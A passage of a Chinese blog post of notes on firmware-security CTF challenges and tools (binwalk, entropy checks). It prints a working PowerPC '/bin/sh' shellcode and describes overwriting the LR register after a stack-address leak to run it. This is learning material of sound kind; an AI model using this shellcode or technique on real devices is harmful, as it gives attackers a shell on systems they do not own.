+      <p>使用题目给的<code>qemu-ppc-static</code>来运行会使得程序打印所有寄存器的值，远程也是这样的</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201953531.png" alt="image-20220120195324259"></p>
+<p>参照如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201955804.png" alt="image-20220120195537738"></p>
+<p>远程肯定也是qemu，地址不会改变，那么就可以获得栈地址，同时依据调试数据也能得到我们输入数据的相应的偏移</p>
+
+        <h3 id="3-寻找shellcode"   >
+          <a href="#3-寻找shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-寻找shellcode" class="headerlink" title="(3)寻找shellcode"></a>(3)寻找shellcode</h3>
+      <p>直接去<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/" >shell-storm | Shellcodes Database</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>找对应的shellcode</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x7c\x3f\x0b\x78&quot;	/*mr	r31,r1*/</span><br><span class="line">&quot;\x7c\xa5\x2a\x79&quot;	/*xor.	r5,r5,r5*/</span><br><span class="line">&quot;\x42\x40\xff\xf9&quot;	/*bdzl+	10000454&lt; main&gt;*/</span><br><span class="line">&quot;\x7f\x08\x02\xa6&quot;	/*mflr	r24*/</span><br><span class="line">&quot;\x3b\x18\x01\x34&quot;	/*addi	r24,r24,308*/</span><br><span class="line">&quot;\x98\xb8\xfe\xfb&quot;	/*stb	r5,-261(r24)*/</span><br><span class="line">&quot;\x38\x78\xfe\xf4&quot;	/*addi	r3,r24,-268*/</span><br><span class="line">&quot;\x90\x61\xff\xf8&quot;	/*stw	r3,-8(r1)*/</span><br><span class="line">&quot;\x38\x81\xff\xf8&quot;	/*addi	r4,r1,-8*/</span><br><span class="line">&quot;\x90\xa1\xff\xfc&quot;	/*stw	r5,-4(r1)*/</span><br><span class="line">&quot;\x3b\xc0\x01\x60&quot;	/*li	r30,352*/</span><br><span class="line">&quot;\x7f\xc0\x2e\x70&quot;	/*srawi	r0,r30,5*/</span><br><span class="line">&quot;\x44\xde\xad\xf2&quot;	/*.long	0x44deadf2*/</span><br><span class="line">&quot;/bin/shZ&quot;; // the last byte becomes NULL</span><br></pre></td></tr></table></div></figure>
+
+<p>对应偏移找到即可</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201202003613.png" alt="image-20220120200332572"></p>
+<p>覆盖LR寄存器为该地址完事</p>
+
+        <h2 id="7-easymsg"   >
+          <a href="#7-easymsg" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-easymsg" class="headerlink" title="7.easymsg"></a>7.easymsg</h2>
+      <p>没看懂</p>
+
+        <h1 id="二、知识点"   >
+          <a href="#二、知识点" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、知识点" class="headerlink" title="二、知识点"></a>二、知识点</h1>
+      
+        <h2 id="1-固件解包-1"   >
+          <a href="#1-固件解包-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-固件解包-1" class="headerlink" title="1.固件解包"></a>1.固件解包</h2>
+      
+        <h3 id="1-binwalk"   >
+          <a href="#1-binwalk" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-binwalk" class="headerlink" title="(1)binwalk"></a>(1)binwalk</h3>
+      <p>常用的命令</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me xxx.bin  <span class="comment">#解包</span></span><br><span class="line">binwalk -A xxx.bin <span class="comment">#查看架构</span></span><br></pre></td></tr></table></div></figure>
+
+<p>有时候可以用mount挂载binwalk打不开的固件</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount ./rootfs.img test</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="2-固件加解密"   >
+          <a href="#2-固件加解密" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-固件加解密" class="headerlink" title="2.固件加解密"></a>2.固件加解密</h2>
+      
+        <h3 id="1-判断加密"   >
+          <a href="#1-判断加密" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-判断加密" class="headerlink" title="(1)判断加密"></a>(1)判断加密</h3>
+      <p>有时候固件可能会被加密，可用binwalk的熵计算来判断，压缩或者加密的数据具有较高的熵值</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -E xxx.bin</span><br></pre></td></tr></table></div></figure>
+
+<p>未加密的</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211850770.png" alt="image-20220121185003706"></p>
+<p>加密的</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211850841.png" alt="image-20220121185022780"></p>
+
+        <h3 id="2-解密常见方法"   >
+          <a href="#2-解密常见方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-解密常见方法" class="headerlink" title="(2)解密常见方法"></a>(2)解密常见方法</h3>
+      <p>逆向，自己寻找等等</p>
+
+        <h2 id="3-固件寻找"   >
+          <a href="#3-固件寻找" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-固件寻找" class="headerlink" title="3.固件寻找"></a>3.固件寻找</h2>
+      <p>网上，官网啥的，或者硬件提取，反正到时候再看一遍把，服务器，吾爱破解…</p>
+<p>观察以下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211856001.png" alt="image-20220121185648863"></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2022/01/17/HWS%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/">http://pig-007.github.io/2022/01/17/HWS%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/2021HWS%E5%9B%BA%E4%BB%B6%E5%AD%A6%E4%B9%A0/">2021HWS固件学习</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/02/09/%E8%A7%A3%E9%87%8A%E5%99%A8PWN/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">解释器PWN</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/01/09/Burpsuite%E4%BD%BF%E7%94%A8/"><span class="paginator-prev__text">Burpsuite使用</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%BB%83%E4%B9%A0%E9%A2%98"><span class="toc-text">
+          一、练习题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-SMT32%E5%9B%BA%E4%BB%B6"><span class="toc-text">
+          1.SMT32固件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-IDA%E5%88%86%E6%9E%90"><span class="toc-text">
+          (1)IDA分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E9%80%89%E6%8B%A9%E6%9E%B6%E6%9E%84"><span class="toc-text">
+          ①选择架构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E8%AE%BE%E7%BD%AE%E9%80%89%E9%A1%B9"><span class="toc-text">
+          ②设置选项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E9%80%89%E6%8B%A9%E5%9B%BA%E4%BB%B6%E5%8A%A0%E8%BD%BD%E5%9C%B0%E5%9D%80"><span class="toc-text">
+          ③选择固件加载地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3%E5%AF%BB%E6%89%BE%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-text">
+          ④寻找函数地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#A-%E6%9F%A5%E6%89%BE%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0"><span class="toc-text">
+          A.查找中断处理函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#B-%E8%AF%86%E5%88%AB%E5%87%BD%E6%95%B0"><span class="toc-text">
+          B.识别函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%A7%A3%E5%AF%86"><span class="toc-text">
+          (2)解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-BlinkBlink-200"><span class="toc-text">
+          2.BlinkBlink_200</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8C%85"><span class="toc-text">
+          (1)固件解包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E6%90%9C%E7%B4%A2"><span class="toc-text">
+          (2)当前目录搜索</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%AE%9A%E4%BD%8D%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">
+          ①定位字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%88%86%E6%9E%90%E5%87%BD%E6%95%B0"><span class="toc-text">
+          ②分析函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2URL%E8%AE%BF%E9%97%AE"><span class="toc-text">
+          ③URL访问</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-httpd"><span class="toc-text">
+          3.httpd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-nodemcu"><span class="toc-text">
+          4.nodemcu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-easybios"><span class="toc-text">
+          5.easybios</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%89%8D%E7%BD%AE%E6%8E%A2%E7%B4%A2"><span class="toc-text">
+          (1)前置探索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-IDA%E5%88%86%E6%9E%90"><span class="toc-text">
+          (2)IDA分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%87%E5%89%B2%E5%88%86%E6%9E%90"><span class="toc-text">
+          (3)切割分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%AF%BB%E6%89%BE%E5%A4%B4%E5%B0%BE%E5%9C%B0%E5%9D%80"><span class="toc-text">
+          ①寻找头尾地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E4%BD%BF%E7%94%A8Winhex%E8%BF%9B%E8%A1%8C%E5%88%87%E5%89%B2"><span class="toc-text">
+          ②使用Winhex进行切割</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-PPPPPPC"><span class="toc-text">
+          6.PPPPPPC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B0%83%E8%AF%95"><span class="toc-text">
+          (1)调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="toc-text">
+          (2)泄露地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AF%BB%E6%89%BEshellcode"><span class="toc-text">
+          (3)寻找shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-easymsg"><span class="toc-text">
+          7.easymsg</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">
+          二、知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8C%85-1"><span class="toc-text">
+          1.固件解包</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-binwalk"><span class="toc-text">
+          (1)binwalk</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%9B%BA%E4%BB%B6%E5%8A%A0%E8%A7%A3%E5%AF%86"><span class="toc-text">
+          2.固件加解密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E5%8A%A0%E5%AF%86"><span class="toc-text">
+          (1)判断加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%A7%A3%E5%AF%86%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95"><span class="toc-text">
+          (2)解密常见方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%9B%BA%E4%BB%B6%E5%AF%BB%E6%89%BE"><span class="toc-text">
+          3.固件寻找</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">108</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">49</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">50</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', 'Please enter characters');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>
